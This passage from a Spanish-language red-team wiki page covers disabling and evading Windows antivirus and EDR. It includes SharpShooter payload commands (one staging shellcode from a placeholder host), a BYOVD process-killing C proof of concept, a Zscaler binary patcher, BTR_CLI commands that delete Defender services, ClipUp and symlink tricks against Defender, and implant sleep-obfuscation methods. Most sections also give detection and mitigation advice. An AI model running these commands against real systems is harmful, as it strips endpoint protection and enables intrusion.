- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Ejemplo de uso de Python para crear injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Otras herramientas

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Más

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD): eliminar AV/EDR desde el espacio del kernel

Storm-2603 utilizó una pequeña utilidad de consola conocida como **Antivirus Terminator** para desactivar las protecciones de los endpoints antes de desplegar ransomware. La herramienta incluye su **propio driver vulnerable, pero *firmado***, y lo aprovecha para ejecutar operaciones privilegiadas en el kernel que ni siquiera los servicios AV Protected-Process-Light (PPL) pueden bloquear.<sup>[[12]](#references)</sup>

Puntos clave
1. **Driver firmado**: El archivo que se escribe en el disco es `ServiceMouse.sys`, pero el binario es el driver legítimamente firmado `AToolsKrnl64.sys`, perteneciente al “System In-Depth Analysis Toolkit” de Antiy Labs. Como el driver tiene una firma válida de Microsoft, se carga incluso cuando Driver-Signature-Enforcement (DSE) está habilitado.
2. **Instalación del servicio**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   La primera línea registra el driver como un **servicio del kernel** y la segunda lo inicia para que `\\.\ServiceMouse` esté accesible desde el espacio de usuario.
3. **IOCTL expuestos por el driver**
   | Código IOCTL | Capacidad                              |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Terminar cualquier proceso por PID (se usa para detener servicios de Defender/EDR) |
   | `0x990000D0` | Eliminar cualquier archivo del disco |
   | `0x990001D0` | Descargar el driver y eliminar el servicio |

   Prueba de concepto mínima en C:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
       HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
       DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
       CloseHandle(hDrv);
       return 0;
   }
   ```
4. **Por qué funciona**: BYOVD omite por completo las protecciones del modo de usuario; el código que se ejecuta en el kernel puede abrir procesos *protegidos*, terminarlos o manipular objetos del kernel, independientemente de PPL/PP, ELAM u otras funciones de hardening.

Detección / Mitigación
•  Habilita la lista de bloqueo de controladores vulnerables de Microsoft (`HVCI`, `Smart App Control`) para que Windows se niegue a cargar `AToolsKrnl64.sys`.
•  Supervisa la creación de nuevos servicios del *kernel* y genera alertas cuando se carga un controlador desde un directorio con permisos de escritura para todos o que no está en la lista de permitidos.
•  Vigila los handles del modo de usuario a objetos de dispositivo personalizados, seguidos de llamadas sospechosas a `DeviceIoControl`.

### Eludir las comprobaciones de postura de Zscaler Client Connector mediante la modificación de binarios en disco

**Client Connector** de Zscaler aplica reglas de postura del dispositivo localmente y depende de Windows RPC para comunicar los resultados a otros componentes. Dos decisiones de diseño débiles hacen posible eludir por completo las comprobaciones:

1. La evaluación de la postura se realiza **íntegramente en el cliente** (se envía un valor booleano al servidor).
2. Los endpoints RPC internos solo validan que el ejecutable que se conecta esté **firmado por Zscaler** (mediante `WinVerifyTrust`).<sup>[[11]](#references)</sup>

Al **modificar cuatro binarios firmados en disco**, se pueden neutralizar ambos mecanismos:

| Binario | Lógica original modificada | Resultado |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | Siempre devuelve `1`, por lo que todas las comprobaciones se consideran conformes |
| `ZSAService.exe` | Llamada indirecta a `WinVerifyTrust` | Se reemplaza por NOP ⇒ cualquier proceso (incluso sin firmar) puede conectarse a las canalizaciones RPC |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | Se reemplaza por `mov eax,1 ; ret` |
| `ZSATunnel.exe` | Comprobaciones de integridad del túnel | Se omiten |

Fragmento mínimo del patcher:

```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
    data = f.read()
    off = data.find(pattern)
    if off == -1:
        print("pattern not found")
    else:
        f.seek(off)
        f.write(replacement)
```

Después de reemplazar los archivos originales y reiniciar la pila de servicios:

* **Todos** los checks de postura aparecen **en verde/conformes**.
* Los binarios sin firmar o modificados pueden abrir los endpoints RPC de named pipe (p. ej., `\\RPC Control\\ZSATrayManager_talk_to_me`).
* El host comprometido obtiene acceso sin restricciones a la red interna definida por las políticas de Zscaler.

Este caso de estudio demuestra cómo se pueden derrotar las decisiones de confianza puramente del lado del cliente y las comprobaciones simples de firmas con unos pocos parches de bytes.

## Abuso de funcionalidad confiable de Microsoft Defender `BTR.sys`

El driver **Boot-Time Removal** de Defender es un contraejemplo útil al BYOVD clásico. `BTR.sys` es un componente de remediación legítimo firmado por Microsoft, sin errores de corrupción de memoria ni interfaz IOCTL; en cambio, tras obtener acceso de administrador y `SeLoadDriverPrivilege`, un operador puede falsificar su transacción privada de remediación y obtener las operaciones previstas sobre archivos y registros en Ring-0. Se trata de una **primitiva de neutralización de AV/EDR posterior al compromiso, no de acceso inicial ni de escalada de privilegios**, y el driver puede extraerse del recurso `BOOTTIMETOOL` del propio `MpEngine.dll` del objetivo, en lugar de importar un driver conspicuo de terceros.<sup>[[36]](#references)</sup>

### Preparación del driver de ejecución única

Normalmente, Defender extrae el recurso como un archivo aleatorio `[a-z]{8}.sys` y registra un servicio de kernel con un nombre similar. `DriverEntry` lee el valor `Args` del servicio, abre el ADS de NTFS al que se hace referencia, descifra y valida la lista de acciones, escribe los comentarios y, tras ejecutarse correctamente, devuelve `0xC0000056` (`STATUS_DELETE_PENDING`) para que el driver se descargue en lugar de permanecer residente. Un servicio falsificado tiene los siguientes valores característicos.<sup>[[36]](#references)[[37]](#references)</sup>

```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```

El flujo `:changelist` contiene un blob cifrado con RC4. Las compilaciones analizadas reutilizan una clave fija de 256 bytes, por lo que el cifrado no constituye un límite de autorización. Un texto sin formato válido tiene una cabecera global de 24 bytes (`Magic=0xFEE1DEAD`, `Version=2`, `PayloadOffset=0x10`, CRC de la cabecera e ID de transacción derivado del payload), seguida de una ruta de feedback UTF-16 terminada en nulo y cualquier cantidad de elementos. Cada elemento tiene una cabecera de 16 bytes (`DataSize`, `Action`, `HeaderCRC`, `DataCRC`) más datos específicos de la acción que terminan en **exactamente cuatro bytes NUL**. Cada región de cabecera/datos se verifica de forma independiente con CRC-32, polinomio `0xEDB88320`, estado inicial `0xFFFFFFFF` y **sin XOR final** (`~CRC32`); el estado del CRC se reinicia para cada región.<sup>[[36]](#references)[[37]](#references)</sup>

Los ID de acción aceptados exponen estas primitivas del kernel.<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Datos del elemento | Resultado |
| --- | --- | --- |
| 1 | `[ruta UTF-16]` | Eliminar un archivo, incluso si está bloqueado |
| 2 | `[ruta UTF-16]` | Eliminar un directorio vacío |
| 3 | `[Flags][origen][destino]` | Mover un archivo a una ruta protegida elegida por el atacante; un destino vacío significa eliminar |
| 4 | `[Flags][ruta de clave]` | Eliminar recursivamente una clave del registro |
| 5 | `[Flags][ruta de clave + "\\" + valor]` | Eliminar un valor del registro |
| 6 | `[Flags][tipo][tamaño][ruta de clave + "\\" + valor][datos]` | Crear/actualizar un valor del registro y crear las rutas de clave que falten |

En las acciones 5 y 6, el separador entre clave y valor en el formato transmitido son **dos barras invertidas consecutivas**; una ruta con el formato convencional no se dividirá correctamente. El archivo de feedback refleja en gran medida la solicitud, pero los primeros cuatro bytes de datos de cada elemento se convierten en su `NTSTATUS` resultante. Para las acciones 1 y 2, que no tienen un campo de flags inicial, BTR desplaza la ruta a los cuatro bytes reservados finales para dejar espacio para ese estado.<sup>[[36]](#references)</sup>

### Flujo de trabajo de `BTR_CLI` y ventana de inicio temprano

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) implementa la cadena completa: extrae `BTR.sys` del Defender local, crea `<random>.sys:changelist` y un flujo de feedback, serializa/calcula las sumas de comprobación/cifra acciones encadenadas, crea directamente la clave del registro del servicio y, después, llama a `NtLoadDriver` para `-trigger now` o lo deja como controlador de inicio del sistema para `-trigger boot`. La preparación directa del registro evita la ruta normal de SCM `CreateServiceW` y, por tanto, **no** genera el evento de instalación del servicio ID 7045. Los artefactos activados durante el arranque se pueden eliminar después con `BTR_CLI.exe -cleanup <service_name>`.<sup>[[36]](#references)[[37]](#references)</sup>

```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```

`Start=0` no es utilizable porque BTR realiza operaciones de E/S de archivos desde `DriverEntry` antes de que la pila de almacenamiento y el enlace `SystemRoot` estén listos. `Start=1` junto con el grupo de alta prioridad `Boot Bus Extender` se ejecuta en la Fase 1: NTFS está disponible, pero muchos controladores de seguridad de inicio del sistema y servicios EDR en modo usuario aún no se han inicializado. Los filtros de inicio de arranque, como `WdFilter`, pueden estar cargados, pero BTR puede eliminar sus binarios o la configuración de sus servicios antes del siguiente inicio, y puede borrar los ejecutables de los servicios antes de que SCM los inicie. ELAM no cierra esta brecha porque BTR se ejecuta después de la evaluación de inicio de arranque y tiene una firma válida de Microsoft.<sup>[[36]](#references)</sup>

Varias acciones se ejecutan en una sola transacción. La PoC antepone la Acción 1 para la ruta codificada de forma fija `\SystemRoot\Temp\BootClean.log`: BTR crea este registro, luego procesa su propia solicitud de eliminación y lo borra antes de descargarse. Esto reduce las evidencias, mientras que guardar la retroalimentación en `<random>.sys:<random>.dat` permite eliminar el controlador y ambos flujos a la vez.<sup>[[36]](#references)[[37]](#references)</sup>

### Correlaciones de detección de alta señal

Las reglas basadas únicamente en firmas y la lista de bloqueo de controladores vulnerables de Microsoft no abordan el abuso de la funcionalidad prevista de BTR. Se prefieren estas correlaciones de comportamiento, distinguiendo la actividad legítima derivada de Defender de la de un iniciador arbitrario.<sup>[[36]](#references)</sup>

- **Sysmon 15:** la creación de `.sys:changelist` es universal en la preparación de BTR. Un ADS `.dat` adjunto al mismo `.sys` resulta especialmente sospechoso, ya que Defender normalmente guarda la retroalimentación en `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 sin System 7045:** correlaciona la creación directa de `HKLM\SYSTEM\CurrentControlSet\Services\<random>` que contiene `Args=...:changelist` y `Group=Boot Bus Extender` con la ausencia del evento de instalación correspondiente de SCM.
- **Sysmon 6 -> 23:** correlaciona la carga de un controlador BTR conocido que no proviene de Defender con una eliminación posterior de archivos atribuida a `System`/PID 4, especialmente si se trata de binarios de seguridad.
- **Sysmon 11 -> 23:** genera una alerta ante la creación y eliminación rápidas de `\SystemRoot\Temp\BootClean.log` por `System`/PID 4.
- Restringe y audita la asignación y habilitación de `SeLoadDriverPrivilege`; una firma de Microsoft por sí sola no basta para confiar en un controlador de herramienta de seguridad preparado por `cmd.exe`, PowerShell o un proceso desconocido.

## Abusar de Protected Process Light (PPL) para alterar AV/EDR con LOLBINs

Protected Process Light (PPL) aplica una jerarquía de firmante/nivel para que solo los procesos protegidos de nivel igual o superior puedan alterar los demás. Desde una perspectiva ofensiva, si puedes iniciar legítimamente un binario habilitado para PPL y controlar sus argumentos, puedes convertir una funcionalidad benigna (por ejemplo, el registro) en una primitiva de escritura restringida y respaldada por PPL contra directorios protegidos que usa AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Qué hace que un proceso se ejecute como PPL
- El EXE de destino (y las DLL cargadas) deben estar firmados con un EKU compatible con PPL.
- El proceso debe crearse con CreateProcess usando los flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Se debe solicitar un nivel de protección compatible con el firmante del binario (por ejemplo, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` para firmantes antimalware, `PROTECTION_LEVEL_WINDOWS` para firmantes de Windows). Los niveles incorrectos harán que la creación falle.

Consulta también aquí una introducción más amplia a PP/PPL y la protección de LSASS:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Herramientas de iniciador
- Herramienta auxiliar de código abierto: CreateProcessAsPPL (selecciona el nivel de protección y pasa los argumentos al EXE de destino):
  - [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Patrón de uso:

```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```

Primitiva LOLBIN: ClipUp.exe
- El binario del sistema firmado `C:\Windows\System32\ClipUp.exe` se inicia a sí mismo y acepta un parámetro para escribir un archivo de registro en una ruta especificada por quien lo invoca.
- Cuando se ejecuta como un proceso PPL, la escritura del archivo se realiza con respaldo de PPL.
- ClipUp no puede procesar rutas que contengan espacios; usa rutas cortas 8.3 para apuntar a ubicaciones normalmente protegidas.

Ayudantes para rutas cortas 8.3
- Listar nombres cortos: `dir /x` en cada directorio principal.
- Obtener una ruta corta en cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Cadena de abuso (abstracta)
1) Inicia el LOLBIN compatible con PPL (ClipUp) con `CREATE_PROTECTED_PROCESS` mediante un lanzador (p. ej., CreateProcessAsPPL).
2) Pasa el argumento de ruta del registro de ClipUp para forzar la creación de un archivo en un directorio protegido del AV (p. ej., Defender Platform). Usa nombres cortos 8.3 si es necesario.
3) Si el AV suele tener abierto o bloqueado el binario objetivo mientras está en ejecución (p. ej., MsMpEng.exe), programa la escritura durante el arranque, antes de que se inicie el AV, instalando un servicio de inicio automático que se ejecute antes de forma fiable. Valida el orden de arranque con Process Monitor (registro de arranque).
4) Al reiniciar, la escritura respaldada por PPL se realiza antes de que el AV bloquee sus binarios, lo que corrompe el archivo objetivo e impide su inicio.

Ejemplo de invocación (rutas redactadas o acortadas por seguridad):

```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```

Notas y restricciones
- No puedes controlar el contenido que escribe ClipUp, solo dónde lo coloca; esta primitiva sirve para corromper, no para inyectar contenido preciso.
- Se requieren permisos de administrador local/SYSTEM para instalar/iniciar un servicio y una ventana de reinicio.
- La sincronización es crítica: el destino no debe estar abierto; la ejecución durante el arranque evita bloqueos de archivos.

Detecciones
- Creación del proceso `ClipUp.exe` con argumentos inusuales, especialmente si lo inicia un lanzador no estándar, cerca del arranque.
- Servicios nuevos configurados para iniciar automáticamente binarios sospechosos y que se inician sistemáticamente antes que Defender/AV. Investiga la creación o modificación de servicios antes de los fallos de inicio de Defender.
- Supervisión de la integridad de archivos de los binarios/directorios de Platform de Defender; creaciones o modificaciones inesperadas de archivos por procesos con indicadores de proceso protegido.
- Telemetría de ETW/EDR: busca procesos creados con `CREATE_PROTECTED_PROCESS` y uso anómalo de niveles PPL por binarios que no sean de AV.

Mitigaciones
- WDAC/Code Integrity: restringe qué binarios firmados pueden ejecutarse como PPL y bajo qué procesos padre; bloquea la ejecución de ClipUp fuera de contextos legítimos.
- Higiene de servicios: restringe la creación/modificación de servicios de inicio automático y supervisa la manipulación del orden de inicio.
- Asegúrate de que estén habilitadas la protección contra alteraciones de Defender y las protecciones de inicio temprano; investiga los errores de inicio que indiquen corrupción de binarios.
- Considera deshabilitar la generación de nombres cortos 8.3 en los volúmenes que alojan herramientas de seguridad, si es compatible con tu entorno (pruébalo exhaustivamente).

## Manipulación de Microsoft Defender mediante secuestro de symlink de la carpeta de versión de Platform

Windows Defender elige la plataforma desde la que se ejecuta enumerando las subcarpetas de:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Selecciona la subcarpeta con la cadena de versión lexicográficamente más alta (por ejemplo, `4.18.25070.5-0`) y luego inicia desde allí los procesos del servicio Defender (actualizando las rutas del servicio y del registro según corresponda). Esta selección confía en las entradas de directorio, incluidos los puntos de reanálisis de directorio (symlinks). Un administrador puede aprovechar esto para redirigir Defender a una ruta donde el atacante pueda escribir y lograr DLL sideloading o interrumpir el servicio.<sup>[[21]](#references)[[22]](#references)</sup>

Requisitos previos
- Administrador local (necesario para crear directorios/symlinks en la carpeta Platform)
- Capacidad para reiniciar o activar una nueva selección de plataforma de Defender (reinicio del servicio durante el arranque)
- Solo se necesitan herramientas integradas (`mklink`)

Por qué funciona
- Defender bloquea las escrituras en sus propias carpetas, pero la selección de plataforma confía en las entradas de directorio y elige la versión lexicográficamente más alta sin validar que el destino resuelva a una ruta protegida/de confianza.

Paso a paso (ejemplo)
1) Prepara un clon con permisos de escritura de la carpeta de plataforma actual, por ejemplo, `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Crea un enlace simbólico de directorio con una versión superior dentro de Platform que apunte a tu carpeta:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Selección del desencadenador (se recomienda reiniciar):
```cmd
shutdown /r /t 0
```
4) Verifica que MsMpEng.exe (WinDefend) se ejecute desde la ruta redirigida:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Deberías observar la nueva ruta del proceso en `C:\TMP\AV\` y la configuración del servicio/registro reflejando esa ubicación.

Opciones de post-explotación
- DLL sideloading/code execution: Coloca o reemplaza DLLs que Defender carga desde su directorio de aplicación para ejecutar código en los procesos de Defender. Consulta la sección anterior: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Terminación/denegación del servicio: Elimina el version-symlink para que, en el siguiente inicio, la ruta configurada no se resuelva y Defender no pueda iniciarse:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Ten en cuenta que esta técnica no permite escalar privilegios por sí sola; requiere derechos de administrador.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Los equipos de red team pueden trasladar la evasión en tiempo de ejecución desde el implante C2 al propio módulo objetivo, enganchando su Import Address Table (IAT) y dirigiendo las API seleccionadas a código position-independent (PIC) controlado por el atacante. Esto generaliza la evasión más allá de la pequeña superficie de API que exponen muchos kits (p. ej., CreateProcessA) y extiende las mismas protecciones a BOFs y DLL de post-exploitation.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Enfoque de alto nivel
- Prepara un blob PIC junto al módulo objetivo mediante un reflective loader (antepuesto o complementario). El PIC debe ser autónomo y position-independent.
- Cuando se carga la DLL anfitriona, recorre su IMAGE_IMPORT_DESCRIPTOR y modifica las entradas de la IAT de las importaciones objetivo (p. ej., CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) para que apunten a wrappers PIC ligeros.
- Cada wrapper PIC ejecuta las evasiones antes de hacer tail-call a la dirección de la API real. Entre las evasiones típicas se incluyen:
  - Enmascarar/desenmascarar la memoria alrededor de la llamada (p. ej., cifrar regiones del beacon, RWX→RX, cambiar los nombres/permisos de las páginas) y restaurarla después de la llamada.
  - Call-Stack Spoofing: construir una pila benigna y pasar a la API objetivo para que el análisis de la pila de llamadas resuelva los frames esperados.<sup>[[9]](#references)</sup>
- Para garantizar la compatibilidad, exporta una interfaz para que un script de Aggressor (o equivalente) pueda registrar qué API debe enganchar para Beacon, BOFs y DLL de post-exploitation.

Por qué usar IAT hooking en este caso
- Funciona con cualquier código que use la importación enganchada, sin modificar el código de las herramientas ni depender de Beacon para redirigir API específicas.
- Abarca las DLL de post-exploitation: enganchar LoadLibrary* permite interceptar las cargas de módulos (p. ej., System.Management.Automation.dll, clr.dll) y aplicar el mismo enmascaramiento y evasión de pila a sus llamadas de API.
- Permite volver a usar de forma fiable comandos de post-exploitation que crean procesos frente a detecciones basadas en la pila de llamadas, envolviendo CreateProcessA/W.

Esquema mínimo de IAT hook (pseudocódigo x64 C/C++)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notas
- Aplica el parche después de las relocations/ASLR y antes del primer uso del import. Los loaders reflectivos como TitanLdr/AceLdr demuestran el hooking durante el DllMain del módulo cargado.
- Mantén los wrappers pequeños y seguros para PIC; resuelve la API real mediante el valor original de la IAT que capturaste antes del parcheo o mediante LdrGetProcedureAddress.
- Usa transiciones RW → RX para PIC y evita dejar páginas con permisos de escritura y ejecución.

Stub de spoofing de call stack
- Los stubs PIC de estilo Draugr construyen una cadena de llamadas falsa (con direcciones de retorno dentro de módulos benignos) y luego hacen pivot hacia la API real.
- Esto evita las detecciones que esperan stacks canónicos de Beacon/BOFs al llamar a APIs sensibles.
- Combínalo con técnicas de stack cutting/stack stitching para llegar a los frames esperados antes del prólogo de la API.

Integración operativa
- Antepon el loader reflectivo a las DLL post-ex para que el PIC y los hooks se inicialicen automáticamente cuando se cargue la DLL.
- Usa un script de Aggressor para registrar las APIs objetivo, de modo que Beacon y los BOFs se beneficien de forma transparente de la misma ruta de evasión, sin cambios en el código.

Consideraciones de detección/DFIR
- Integridad de la IAT: entradas que se resuelven en direcciones que no pertenecen a una imagen (heap/anon); verificación periódica de los punteros de importación.
- Anomalías en el stack: direcciones de retorno que no pertenecen a imágenes cargadas; transiciones abruptas a PIC que no pertenece a una imagen; ascendencia de RtlUserThreadStart incoherente.
- Telemetría del loader: escrituras en la IAT dentro del proceso, actividad temprana en DllMain que modifica los thunks de importación, regiones RX inesperadas creadas durante la carga.
- Evasión de carga de imágenes: si se hace hooking de LoadLibrary*, monitoriza las cargas sospechosas de ensamblados de automation/clr correlacionadas con eventos de enmascaramiento de memoria.

Bloques de construcción y ejemplos relacionados
- Loaders reflectivos que realizan parcheo de la IAT durante la carga (p. ej., TitanLdr, AceLdr)
- Hooks de enmascaramiento de memoria (p. ej., simplehook) y PIC de stack cutting (stackcutting)
- Stubs PIC de spoofing de call stack (p. ej., Draugr)


## Hooking de la IAT en tiempo de importación + ofuscación durante el sleep (Crystal Palace/PICO)

### Hooks de la IAT en tiempo de importación mediante un PICO residente

Si controlas un loader reflectivo, puedes interceptar los imports **durante** `ProcessImports()` reemplazando el puntero `GetProcAddress` del loader por un resolver personalizado que compruebe primero los hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Crea un **PICO residente** (objeto PIC persistente) que sobreviva después de que el PIC transitorio del loader se libere.
- Exporta una función `setup_hooks()` que sobrescriba el resolver de imports del loader (p. ej., `funcs.GetProcAddress = _GetProcAddress`).
- En `_GetProcAddress`, omite los imports por ordinal y usa una búsqueda de hooks basada en hash como `__resolve_hook(ror13hash(name))`. Si hay un hook, devuélvelo; de lo contrario, delega en el `GetProcAddress` real.
- Registra los objetivos de los hooks en tiempo de enlace con las entradas `addhook "MODULE$Func" "hook"` de Crystal Palace. El hook sigue siendo válido porque reside dentro del PICO residente.

Esto permite **redirigir la IAT en tiempo de importación** sin parchear la sección de código de la DLL cargada después de la carga.

### Forzar imports susceptibles de hooking cuando el objetivo recorre el PEB

Los hooks en tiempo de importación solo se activan si la función está realmente en la IAT del objetivo. Si un módulo resuelve APIs mediante un recorrido del PEB + hash (sin entrada de importación), fuerza un import real para que el loader lo detecte mediante la ruta `ProcessImports()`:

- Reemplaza la resolución de exports por hash (p. ej., `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) con una referencia directa como `&WaitForSingleObject`.
- El compilador genera una entrada en la IAT, lo que permite la interceptación cuando el loader reflectivo resuelve los imports.

### Ofuscación de sleep/idle de estilo Ekko sin parchear `Sleep()`

En vez de parchear `Sleep`, intercepta las **primitivas reales de espera/IPC** que usa el implante (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Para las esperas largas, envuelve la llamada en una cadena de ofuscación de estilo Ekko que cifra la imagen en memoria durante los periodos de inactividad:<sup>[[31]](#references)[[27]](#references)</sup>

- Usa `CreateTimerQueueTimer` para programar una secuencia de callbacks que llamen a `NtContinue` con frames `CONTEXT` preparados.
- Cadena típica (x64): establece la imagen como `PAGE_READWRITE` → cifra con RC4 mediante `advapi32!SystemFunction032` toda la imagen mapeada → realiza la espera bloqueante → descifra con RC4 → **restaura los permisos por sección** recorriendo las secciones PE → señala que la operación ha terminado.
- `RtlCaptureContext` proporciona una plantilla `CONTEXT`; clónala en varios frames y configura los registros (`Rip/Rcx/Rdx/R8/R9`) para invocar cada paso.

Detalle operativo: devuelve “success” para las esperas largas (p. ej., `WAIT_OBJECT_0`) para que el llamador continúe mientras la imagen está enmascarada. Este patrón oculta el módulo a los scanners durante los periodos de inactividad y evita la firma clásica de `Sleep()` parcheado.

Ideas de detección (basadas en telemetría)
- Ráfagas de callbacks de `CreateTimerQueueTimer` que apuntan a `NtContinue`.
- Uso de `advapi32!SystemFunction032` en buffers grandes y contiguos, del tamaño de una imagen.
- Llamadas a `VirtualProtect` sobre rangos grandes, seguidas de la restauración personalizada de permisos por sección.

### Registro de CFG en tiempo de ejecución para gadgets de ofuscación durante el sleep

En objetivos con CFG habilitado, el primer salto indirecto a un gadget situado en medio de una función, como `jmp [rbx]` o `jmp rdi`, normalmente hará que el proceso se bloquee con `STATUS_STACK_BUFFER_OVERRUN`, porque el gadget no está presente en los metadatos CFG del módulo. Para mantener activas las cadenas de estilo Ekko/Kraken en procesos protegidos:<sup>[[30]](#references)</sup>

- Registra cada destino indirecto que use la cadena mediante `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` y entradas `CFG_CALL_TARGET_VALID`.
- Para direcciones dentro de imágenes cargadas (`ntdll`, `kernel32`, `advapi32`), el `MEMORY_RANGE_ENTRY` debe empezar en la **base de la imagen** y abarcar el **tamaño completo de la imagen**.
- Para regiones mapeadas manualmente/PIC/stomped, usa la **base de asignación** y el tamaño de la asignación.
- Marca no solo el gadget de dispatch, sino también los exports a los que se llega indirectamente (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, llamadas al sistema de espera/evento) y cualquier sección ejecutable controlada por el atacante que vaya a convertirse en un destino indirecto.

Esto convierte las cadenas de sleep de tipo ROP/JOP, que “solo funcionan en procesos sin CFG”, en una primitiva reutilizable para `explorer.exe`, navegadores, `svchost.exe` y otros endpoints compilados con `/guard:cf`.

### Spoofing de stack compatible con CET para threads en sleep

La sustitución completa de `CONTEXT` genera mucho ruido y puede fallar en sistemas con CET Shadow Stack porque un `Rip` falsificado aún debe coincidir con el shadow stack de hardware. Un patrón más seguro de enmascaramiento durante el sleep es:<sup>[[30]](#references)</sup>

- Elige otro thread del mismo proceso y lee los límites de su stack `NT_TIB` / TEB (`StackBase`, `StackLimit`) mediante `NtQueryInformationThread`.
- Haz una copia de respaldo del TEB/TIB real del thread actual.
- Captura el contexto real del thread en sleep con `GetThreadContext`.
- Copia **solo** el `Rip` real al contexto falsificado y deja intactos el `Rsp`/estado del stack falsificados.
- Durante el periodo de sleep, copia el `NT_TIB` del thread suplantado al TEB actual para que los stack walkers hagan el unwind dentro de un rango de stack legítimo.
- Cuando termine la espera, restaura el TIB original y el contexto del thread.

Esto conserva un puntero de instrucción compatible con CET y engaña a los stack walkers de EDR que confían en los metadatos del stack del TEB para validar los unwinds.

### Alternativa basada en APC: Kraken Mask

Si el dispatch mediante timer queue deja una firma demasiado reconocible, la misma secuencia de sleep-encrypt-spoof-restore puede ejecutarse desde un thread auxiliar suspendido mediante APC encolados:<sup>[[27]](#references)</sup>

